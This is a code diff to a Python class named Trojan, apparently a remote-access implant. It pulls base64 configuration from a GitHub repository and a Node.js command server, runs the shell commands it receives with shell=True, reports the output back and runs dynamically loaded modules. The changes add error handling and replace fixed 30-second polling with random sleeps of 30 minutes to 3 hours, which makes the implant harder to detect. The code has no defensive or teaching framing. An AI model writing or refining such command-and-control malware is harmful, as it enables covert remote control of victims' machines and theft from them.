@@ -33,6 +33,7 @@ class Trojan:
         try:
             config_json = get_file_contents('config', self.config_file, self.repo)
             decoded_config = base64.b64decode(config_json).decode('utf-8')
+            # print(f"Decoded config JSON: {decoded_config}")  # Debug output
             return json.loads(decoded_config)
         except Exception as e:
             print(f"Error fetching GitHub config: {e}")
@@ -45,12 +46,6 @@ class Trojan:
         except requests.exceptions.RequestException as e:
             print(f"[*] Failed to get config from Node.js server: {e}")
             return None
-
-    def clear_nodejs_config(self):
-        try:
-            requests.delete(f"{self.node_server_url}/config/clear")
-        except requests.exceptions.RequestException as e:
-            print(f"[*] Failed to clear config on Node.js server: {e}")
 
     def send_command_result(self, command, result):
         try:
@@ -79,7 +74,7 @@ class Trojan:
                 shell_command = command.get('command')
                 if shell_command:
                     try:
-                        print(f"[*] Executing command: {shell_command}")
+                        print(f"[*] Executing command: {shell_command}")  # Debug output
                         result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
                         result = result.decode('utf-8')
                     except subprocess.CalledProcessError as e:
@@ -96,8 +91,12 @@ class Trojan:
             print(f"Invalid command format: {command}")
 
     def module_runner(self, module):
-        result = sys.modules[module].run()
-        self.store_module_result(result)
+        try:
+            result = sys.modules[module].run()
+            self.store_module_result(result)
+        except Exception as e:
+            print(f"Error running module {module}: {e}")
+            self.store_module_result(f"Module {module} failed: {e}")
 
     def store_module_result(self, data):
         message = datetime.now().isoformat()
@@ -119,10 +118,7 @@ class Trojan:
                 for command in nodejs_config.get('commands', []):
                     self.execute_command(command)
 
-                self.clear_nodejs_config()  # Clear commands after processing
-
-            # Check for new commands every 30 seconds instead of random long intervals
-            time.sleep(30)
+            time.sleep(random.randint(30*60, 3*60*60))
 
 class GitImporter:
     def __init__(self):
